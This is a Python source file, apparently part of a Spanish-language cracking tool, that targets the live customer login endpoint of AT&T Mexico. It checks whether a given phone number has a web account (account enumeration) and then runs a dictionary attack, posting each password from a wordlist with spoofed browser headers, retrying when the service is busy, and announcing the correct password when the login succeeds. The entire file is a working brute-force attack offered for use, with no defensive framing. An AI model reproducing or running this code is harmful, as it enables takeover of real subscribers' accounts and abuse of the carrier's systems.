import colores
import requests
import validacion


class att:

    def __init__(self, numero):
        self.numero = numero
        self.compañia = "ATT"
        self.bloqueado = False
        self.registrado = False
        self.registradoWeb = False
        self.comprobarNumero()

    def comprobarNumero(self):

        _response = requests.post('https://www.att.com.mx/MiATTWeb/sesion.do',
                                  headers=self.headers(),
                                  data=self.data(self.numero, 'badSecurity'),
                                  timeout=50)

        self.validaResponse(_response.text)

    def validaResponse(self, _data):

        if 'exito":false' in _data:
            self.registradoWeb = True
            self.registrado = True

        elif "Lo sentimos el servicio" in _data:
            self.registradoWeb = False
            self.registrado = False
            return self.comprobarNumero()

        else:
            self.registradoWeb = False
            self.registrado = False

    def ataqueDiccionario(self):

        colores.textPrimario(" >>> Casi empezamos ")

        _contraseñas = validacion.leerContraseñas()

        colores.hr()
        colores.textPrimario(" >>> Atancando ...  \n")

        for _contraseña in _contraseñas:

            _contraseña = _contraseña.rstrip('\n')

            print("  Probando:", _contraseña.ljust(30), "\033[0;m", end='\r')

            _response = self.ataque(self.numero, _contraseña)

            if 'rpKey' in _response:
                colores.hr()
                colores.textSuccess("\t\t\t[ Contraseña correcta : " + _contraseña + "]")
                colores.hr()
                exit()

        colores.hr()
        colores.textError("\t\t\t[ Contraseña no encontrada ]")
        colores.hr()
        exit()

    def ataque(self, _numero, _contraseña):

        _response = requests.post('https://www.att.com.mx/MiATTWeb/sesion.do',
                                  headers=self.headers(),
                                  data=self.data(_numero, _contraseña),
                                  timeout=50)

        if 'Lo sentimos el servicio' in _response.text:
            return self.ataque(self.numero, _contraseña)

        else:
            return _response.text

    def headers(self):

        return {
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'X-Requested-With': 'XMLHttpRequest',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36'
        }

    def data(self, _numero, _password):

        return {
            'command': 'userValidate',
            'dn': _numero,
            'remenP': 'no',
            'keyLoad': 'miattrpw',
            'loadKey': '',
            'passwd': _password
        }
